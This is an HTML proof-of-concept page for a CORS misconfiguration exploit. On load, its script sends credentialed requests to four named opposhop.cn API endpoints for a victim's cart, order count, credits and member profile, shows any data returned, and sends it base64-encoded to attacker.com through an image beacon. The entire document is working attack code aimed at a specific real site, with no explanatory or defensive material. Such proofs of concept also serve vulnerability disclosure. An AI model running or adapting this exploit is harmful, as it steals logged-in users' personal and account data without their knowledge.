<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CORS Exploit PoC</title>
</head>

<body>
<h2>Loading...</h2>

<script>

async function steal(url, name) {
    try {
        let res = await fetch(url, {
            method: "GET",
            credentials: "include",
            headers: {
                "Accept": "application/json"
            }
        });

        if (!res.ok) return;

        let text = await res.text();

        // check for real data
        if (text.length > 20 && text.includes("code")) {

            console.log("[+] Data from:", name, text);

            let pre = document.createElement("pre");
            pre.innerText = "[DATA] " + name + "\n" + text;
            document.body.appendChild(pre);

            // exfiltration
            new Image().src = "https://attacker.com/log?d=" + btoa(name + ":" + text);

        }

    } catch (e) {
        console.log("Error:", e);
    }
}

function runExploit() {

    steal("https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list", "cart");
    steal("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount", "count");
    steal("https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit", "credits");
    steal("https://www.opposhop.cn/cn/oapi/users/web/member/check?unpaid=0&cartNumber=0", "profile");

}

runExploit();

</script>

</body>
</html>
